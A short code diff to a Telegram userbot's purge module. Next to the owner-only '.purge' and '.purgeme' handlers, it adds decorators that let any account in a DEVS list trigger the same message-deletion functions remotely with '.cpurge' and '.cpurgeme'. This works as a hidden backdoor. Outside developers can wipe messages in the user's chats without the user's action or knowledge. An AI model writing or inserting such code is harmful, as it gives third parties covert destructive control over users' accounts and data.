@@ -13,6 +13,7 @@ from userbot.events import register
 
 
 @register(outgoing=True, pattern=r"^\.purge$")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpurge$")
 async def fastpurger(purg):
     chat = await purg.get_input_chat()
     msgs = []
@@ -46,6 +47,7 @@ async def fastpurger(purg):
 
 
 @register(outgoing=True, pattern=r"^\.purgeme")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpurgeme$")
 async def purgeme(delme):
     message = delme.text
     count = int(message[9:])
